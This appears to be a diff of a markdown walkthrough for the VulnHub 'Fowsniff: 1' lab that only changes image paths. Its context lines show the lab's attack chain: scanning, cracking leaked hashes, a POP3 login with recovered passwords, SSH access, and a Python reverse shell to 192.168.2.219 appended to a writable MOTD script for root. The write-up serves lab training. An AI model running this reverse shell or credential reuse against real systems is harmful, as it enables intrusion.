@@ -3,7 +3,7 @@
 - **Machine:** Fowsniff: 1
 - **Download:** https://www.vulnhub.com/entry/fowsniff-1,262/
 
-![](828-1.png)
+![](images/828-1.png)
 
 ---
 
@@ -29,7 +29,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](828-2.png)
+![](images/828-2.png)
 
 ---
 
@@ -41,7 +41,7 @@ Run a comprehensive Nmap scan to enumerate all open ports, services, operating s
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.134
 ```
 
-![](828-3.png)
+![](images/828-3.png)
 
 ---
 
@@ -65,7 +65,7 @@ This command performs an aggressive scan and runs the `http-enum` NSE script to 
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.134
 ```
 
-![](828-4.png)
+![](images/828-4.png)
 
 ---
 
@@ -88,7 +88,7 @@ Run Gobuster to discover additional directories.
 gobuster dir -u http://192.168.2.134/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
 ```
 
-![](828-5.png)
+![](images/828-5.png)
 
 ---
 
@@ -98,7 +98,7 @@ Visit:
 
 - http://192.168.2.134/security.txt
 
-![](828-6.png)
+![](images/828-6.png)
 
 ---
 
@@ -110,7 +110,7 @@ Search for **Fowsniff Corp** and locate the leaked GitHub file.
 https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt
 ```
 
-![](828-7.png)
+![](images/828-7.png)
 
 The file contains employee usernames and password hashes.
 
@@ -136,7 +136,7 @@ Use an online hash lookup service.
 https://hashes.com/en/decrypt/hash
 ```
 
-![](828-8.png)
+![](images/828-8.png)
 
 Recovered passwords:
 
@@ -174,7 +174,7 @@ USER seina
 PASS scoobydoo2
 ```
 
-![](828-9.png)
+![](images/828-9.png)
 
 ---
 
@@ -186,7 +186,7 @@ List available emails.
 LIST
 ```
 
-![](828-10.png)
+![](images/828-10.png)
 
 Retrieve the emails.
 
@@ -198,9 +198,9 @@ RETR 1
 RETR 2
 ```
 
-![](828-11.png)
+![](images/828-11.png)
 
-![](828-12.png)
+![](images/828-12.png)
 
 ### Credentials Discovered
 
@@ -219,7 +219,7 @@ Connect to the target using the recovered credentials.
 ssh baksteen@192.168.2.134
 ```
 
-![](828-13.png)
+![](images/828-13.png)
 
 Successful authentication provides shell access.
 
@@ -231,7 +231,7 @@ Successful authentication provides shell access.
 
 After gaining access, enumerate the system. The user **baksteen** belongs to multiple groups, making it worthwhile to search for writable files owned by the **users** group.
 
-![](828-14.png)
+![](images/828-14.png)
 
 ---
 
@@ -241,7 +241,7 @@ After gaining access, enumerate the system. The user **baksteen** belongs to mul
 find / -group users -type f 2>/dev/null
 ```
 
-![](828-15.png)
+![](images/828-15.png)
 
 ---
 
@@ -251,7 +251,7 @@ find / -group users -type f 2>/dev/null
 cat /opt/cube/cube.sh
 ```
 
-![](828-16.png)
+![](images/828-16.png)
 
 ---
 
@@ -269,7 +269,7 @@ Append the Python reverse shell payload.
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.219",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
 ```
 
-![](828-17.png)
+![](images/828-17.png)
 
 ---
 
@@ -285,11 +285,11 @@ Reconnect to the SSH service.
 ssh baksteen@192.168.2.134
 ```
 
-![](828-18.png)
+![](images/828-18.png)
 
 A root shell is obtained.
 
-![](828-19.png)
+![](images/828-19.png)
 
 ---
 
@@ -313,7 +313,7 @@ Read the flag.
 cat flag.txt
 ```
 
-![](828-20.png)
+![](images/828-20.png)
 
 ---
 
